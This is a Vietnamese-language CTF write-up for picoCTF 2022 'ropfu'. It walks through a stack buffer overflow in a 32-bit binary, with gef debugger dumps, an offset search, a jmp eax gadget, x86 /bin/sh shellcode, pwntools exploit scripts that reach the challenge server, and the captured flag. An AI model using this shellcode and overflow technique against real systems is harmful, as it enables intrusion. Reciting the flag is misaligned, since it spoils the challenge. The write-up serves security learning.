# Ropfu
### Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  
}
```
Nhìn qua `vuln` thấy `buf` chỉ **16 byte** nhưng gets không kiểm soát độ lớn `input` -> `buffer overflow`. Không có hàm tạo `shell`, cũng k có hàm in `flag`. Chắc là tự tạo `shell` rồi :vv

```java
gef➤  checksec
[+] checksec for 'vuln'
Canary                        : ✓
NX                            : ✘
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
```
`NX disable` nên sẽ `exploit` bằng `shellcode injection`. `Canary enable` nên chắc sẽ khó để overflow

shellcode thì lấy trên mạng cho nhanh =)). Hoặc thư viện pwntools có hàm shellcaft dùng để tạo shell.

```
'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
```
Đây là shell `system('/bin/sh')`. Chạy thử 

```java
gef➤  r
Starting program: vuln
How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd1c0  →  0x414141c3
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0x080e5300  →  <_IO_2_1_stdin_+0> mov BYTE PTR [edx], ah
$edx   : 0xffffd22c  →  0x080e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$esp   : 0xffffd1e0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x080e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$edi   : 0x080e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$eip   : 0x41414141 ("AAAA"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd1e0│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"    ← $esp
...
─────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x41414141
─────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x41414141 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```
:v
Nó có thể overwrite được eip luôn ạ. Tại sao có canary mà vẫn overflow được nhỉ :v

```java
gef➤  pattern create 50
[+] Generating a pattern of 50 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
[+] Saved as '$_gef1'
gef➤  r
Starting program: /mnt/c/ctf/pico_ctf_2022/pico_ropfu/vuln
How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama

Program received signal SIGSEGV, Segmentation fault.
0x61616168 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd1c0  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama"
$ebx   : 0x61616166 ("faaa"?)
$ecx   : 0x080e5300  →  <_IO_2_1_stdin_+0> mov BYTE PTR [edx], ah
$edx   : 0xffffd1f2  →  0x5000ff00
$esp   : 0xffffd1e0  →  "iaaajaaakaaalaaama"
$ebp   : 0x61616167 ("gaaa"?)
$esi   : 0x080e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$edi   : 0x080e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$eip   : 0x61616168 ("haaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd1e0│+0x0000: "iaaajaaakaaalaaama"         ← $esp
0xffffd1e4│+0x0004: "jaaakaaalaaama"
0xffffd1e8│+0x0008: "kaaalaaama"
0xffffd1ec│+0x000c: "laaama"
0xffffd1f0│+0x0010: 0xff00616d ("ma"?)
0xffffd1f4│+0x0014: 0x080e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
0xffffd1f8│+0x0018: 0x00000000
0xffffd1fc│+0x001c: 0x0804a67d  →  <__libc_start_main+1309> add esp, 0x10
─────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616168
─────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x61616168 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern offset $eip
[+] Searching for '68616161'/'61616168' with period=4
[+] Found at offset 28 (little-endian search) likely
gef➤  pattern search iaaa
[+] Searching for '61616169'/'69616161' with period=4
[+] Found at offset 29 (little-endian search) likely
```
`offset` để overwrite `eip` là `28`, khi đó trong `stack` sẽ lưu dãy còn lại phía sau bắt đầu từ vị trí thứ `29` và `input` ta nhập vào sẽ được trỏ tới bởi `eax`. Ý tưởng là sẽ `overwrite` đến shellcode của ta thông qua eip, vì vậy ta cần tìm gadget để jump tới eax -  nơi lưu payload của mình. 

```java
trungdo@TEFO:/pico_ropfu$ ROPgadget --binary vuln | grep "jmp eax"
...
0x0805334b : jmp eax
...
```
### Exploit
```python 
#!/usr/bin/python3
from pwn import *
exe = ELF('./vuln', checksec=False)
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
jmp_eax = 0x0805334b
payload = b'\x90'*28
payload += p32(jmp_eax)
# payload += asm(shellcraft.i386.linux.sh())
payload += shellcode
p = process(exe.path)
input()
p.sendlineafter(b'!\n',payload)
p.interactive()
```
```java
gef➤

Program received signal SIGSEGV, Segmentation fault.
0xff8fe9bd in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xff8fe9a0  →  0x90909090
$ebx   : 0x9090908f
$ecx   : 0x080e5300  →  <_IO_2_1_stdin_+0> mov BYTE PTR [eax], ah
$edx   : 0xff8fe9d7  →  0x00000000
$esp   : 0xff8fe9c0  →  0x6850c031
$ebp   : 0x90909090
$esi   : 0x080e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$edi   : 0x080e5000  →  <_GLOBAL_OFFSET_TABLE_+0> add BYTE PTR [eax], al
$eip   : 0xff8fe9bd  →  0x31080533
$eflags: [zero carry parity ADJUST SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────── stack ────
0xff8fe9c0│+0x0000: 0x6850c031   ← $esp
0xff8fe9c4│+0x0004: 0x68732f2f
0xff8fe9c8│+0x0008: 0x69622f68
0xff8fe9cc│+0x000c: 0x50e3896e
0xff8fe9d0│+0x0010: 0xb0e18953
0xff8fe9d4│+0x0014: 0x0080cd0b
0xff8fe9d8│+0x0018: 0x00000000
0xff8fe9dc│+0x001c: 0x0804a67d  →  <__libc_start_main+1309> add esp, 0x10
─────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0xff8fe9ba                  nop
   0xff8fe9bb                  nop
   0xff8fe9bc                  dec    ebx
 → 0xff8fe9bd                  xor    eax, DWORD PTR ds:0x50c03108
   0xff8fe9c3                  push   0x68732f2f
   0xff8fe9c8                  push   0x6e69622f
   0xff8fe9cd                  mov    ebx, esp
   0xff8fe9cf                  push   eax
   0xff8fe9d0                  push   ebx
─────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0xff8fe9bd in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0xff8fe9bd → xor eax, DWORD PTR ds:0x50c03108
────────────────────────────────────────────────────────────────────────────────────────────
```
qua 7749 lệnh nop ta đã vào được shell nhưng bị fail tại chỗ này `xor eax, DWORD PTR ds:0x50c03108` 

```python
payload = b'\x90'*24
payload += b'\xeb\x04'
payload += b'\x90'*2
payload += p32(jmp_eax)
payload += shellcode
```

Tớ thử những lệnh jump nhỏ để nhảy qua đoạn kiểm tra trên nhưng không có kết quả khả thi. Khi một bước nhảy của con trỏ lệnh là 4byte và shell của ta thì lại nhỏ hơn

```java
gef➤  x/20i $esp
   0xff8d9e40:  xor    eax,eax
   0xff8d9e42:  push   eax
   0xff8d9e43:  push   0x68732f2f
   0xff8d9e48:  push   0x6e69622f
   0xff8d9e4d:  mov    ebx,esp
   0xff8d9e4f:  push   eax
   0xff8d9e50:  push   ebx
   0xff8d9e51:  mov    ecx,esp
   0xff8d9e53:  mov    al,0xb
   0xff8d9e55:  int    0x80
   0xff8d9e57:  add    BYTE PTR [eax],al
   0xff8d9e59:  add    BYTE PTR [eax],al
   0xff8d9e5b:  add    BYTE PTR [ebp-0x5a],bh
   0xff8d9e5e:  add    al,0x8
   0xff8d9e60:  add    BYTE PTR [eax+0xe],dl
   0xff8d9e63:  or     BYTE PTR [eax],al
   0xff8d9e65:  push   eax
   0xff8d9e66:  push   cs
   0xff8d9e67:  or     BYTE PTR [eax],al
   0xff8d9e69:  push   eax
```
Còn một cách khác là cho nó nhảy vào `esp` tại vì bên trong `stack` của ta đang chứa toàn bộ `shellcode` và `esp` đang trỏ vào nó.

      ff e4                   jmp    esp

```python
#!/usr/bin/python3
from pwn import *
exe = ELF('./vuln', checksec=False)
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
jmp_eax = 0x0805334b
payload = b'\x90'*26
payload += b'\xff\xe4'
payload += p32(jmp_eax)
# payload += asm(shellcraft.i386.linux.sh())
payload += shellcode
#p = process(exe.path)
p = remote('saturn.picoctf.net', 55050)
input()
p.sendlineafter(b'!\n',payload)
p.interactive()

```
```java
trungdo@TEFO:pico_ropfu$ python3 bruh.py DEBUG
[DEBUG] '/mnt/c/ctf/pico_ctf_2022/pico_ropfu/vuln' is statically linked, skipping GOT/PLT symbols
[+] Opening connection to saturn.picoctf.net on port 55050: Done

[DEBUG] Received 0x47 bytes:
    b'How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n'
[DEBUG] Sent 0x38 bytes:
    00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
    00000010  90 90 90 90  90 90 90 90  90 90 ff e4  4b 33 05 08  │····│····│····│K3··│
    00000020  31 c0 50 68  2f 2f 73 68  68 2f 62 69  6e 89 e3 50  │1·Ph│//sh│h/bi│n··P│
    00000030  53 89 e1 b0  0b cd 80 0a                            │S···│····│
    00000038
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0xe bytes:
    b'flag.txt\n'
    b'vuln\n'
flag.txt
vuln
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x22 bytes:
    b'picoCTF{5n47ch_7h3_5h311_e81af635}'
picoCTF{5n47ch_7h3_5h311_e81af635}$
```
`flag: picoCTF{5n47ch_7h3_5h311_e81af635}`
